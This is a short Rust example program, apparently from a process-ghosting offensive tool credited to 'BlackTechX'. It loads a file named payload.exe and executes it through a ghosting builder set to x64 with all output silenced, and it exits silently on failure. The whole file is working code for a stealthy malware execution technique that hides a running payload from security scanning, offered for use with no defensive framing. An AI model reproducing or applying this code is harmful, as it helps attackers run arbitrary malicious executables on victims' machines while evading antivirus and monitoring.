//! Silent execution without console output
//! Author: BlackTechX

use process_ghosting::GhostingBuilder;

fn main() {
    // No init() call = no banner
    
    let payload = match std::fs::read("payload.exe") {
        Ok(p) => p,
        Err(_) => {
            // Silent failure - no output
            std::process::exit(1);
        }
    };

    // Silent execution - no output at all
    let result = GhostingBuilder::new(&payload)
        .x64()
        .silent()  // Disable all output
        .execute();

    // Exit with appropriate code
    std::process::exit(if result.is_ok() { 0 } else { 1 });
}